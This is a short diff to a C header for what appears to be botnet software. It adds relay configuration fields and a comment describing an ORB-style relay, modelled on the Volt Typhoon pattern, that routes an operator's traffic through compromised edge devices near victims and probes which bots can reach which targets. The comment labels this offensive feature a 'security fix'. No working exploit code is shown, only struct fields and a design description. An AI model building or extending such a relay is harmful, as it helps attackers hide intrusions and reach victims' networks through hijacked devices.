@@ -150,6 +150,25 @@ typedef struct {
     uint16_t proxy_port;
     char proxy_token[64];
 
+    /* SECURITY FIX (#91): ORB-style single-hop relay (the Volt Typhoon
+     * pattern — proxy operations through compromised edge devices near
+     * the victim). When relay_enabled=1 AND relay_token is set, the bot
+     * listens on relay_port and accepts token-authenticated relay
+     * requests (`RELAY <token> <target_host> <target_port>`), splicing
+     * the connection to the requested target. The relay client helpers
+     * (relay_connect/relay_probe) let the operator dial targets THROUGH
+     * a relay bot instead of directly, and probe which relays can reach
+     * which targets (per-target relay selection). Single-hop only in
+     * this version; multi-hop chaining is future work. Explicitly NOT a
+     * DHT — no peer discovery, no overlay. The same relay_token is
+     * shared by the whole fleet. Configured via relay_enabled= /
+     * relay_port= / relay_token= in the config file or the
+     * NOTNET_RELAY_TOKEN environment variable. Empty relay_token means
+     * the relay refuses to start (fail-closed). */
+    uint8_t relay_enabled;
+    uint16_t relay_port;
+    char relay_token[64];
+
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
     int cred_count;
